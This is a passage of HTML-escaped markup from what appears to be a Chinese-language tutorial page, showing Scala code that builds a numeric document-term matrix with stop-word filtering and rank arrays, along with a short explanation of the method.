&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//First filter out all stop words:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//首先过滤出所有停用词&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;StopWords&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getStopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-43&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordList&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordList&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;StopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-45&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dtmNumeric&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-46&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ranks&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-47&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-48&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;records&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Add the rank to the array of ranks&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-50&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//将评级添加到排序数组中&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-51&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ranks&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ranks&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rank&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-52&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-53&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//And create an array representing all words and their occurrences &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-54&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//for this document:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-55&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//为该文档创建一个数组，表示所有单词及其出现率 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-56&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dtmNumericRecord&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-57&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;wordList&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-58&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-59&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termRecord&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;occurrences&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-60&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termRecord&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-61&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dtmNumericRecord&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dtmNumericRecord&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termRecord&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toDouble&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-62&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-63&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-64&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dtmNumericRecord&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dtmNumericRecord&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-65&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-66&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-67&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dtmNumeric&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dtmNumeric&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;dtmNumericRecord&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-68&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-69&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-70&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-71&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dtmNumeric&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;ranks&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-72&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-73&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-74&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-75&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;DTMRecord&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-76&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rank&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-77&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;occurrences&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mutable&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-78&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0122 seconds] --&gt;
&lt;p&gt;观察这段代码，注意到这里面有一个方法 def getNumericRepresentationForRecords(): (Array[Array[Double]], Array[Double])。这一方法返回一个元组，该元组以一个矩阵作为第一个参数，该矩阵中每一行代表一个文档，每一列代表来自 DTM 文档的完备词汇集中的词汇。注意第一个列表中的浮点数表示词汇出现的次数。&lt;/p&gt;
&lt;p&gt;第二个参数是一个数组，包含第一个列表中所有记录的排序值。&lt;/p&gt;
&lt;p&gt;现在我们可以按如下方式扩展主程序，这样就可以得到所有文档的数值表示：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613ac518776131&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
val documentTermMatrix  = new DTM()
testData.foreach(x =&amp;gt; documentTermMatrix.addDocumentToRecords(x._1,x._2,x._3))&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613ac518776131-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613ac518776131-2&quot;&gt;2&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613ac518776131-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;documentTermMatrix&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;DTM&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613ac518776131-2&quot;&gt;
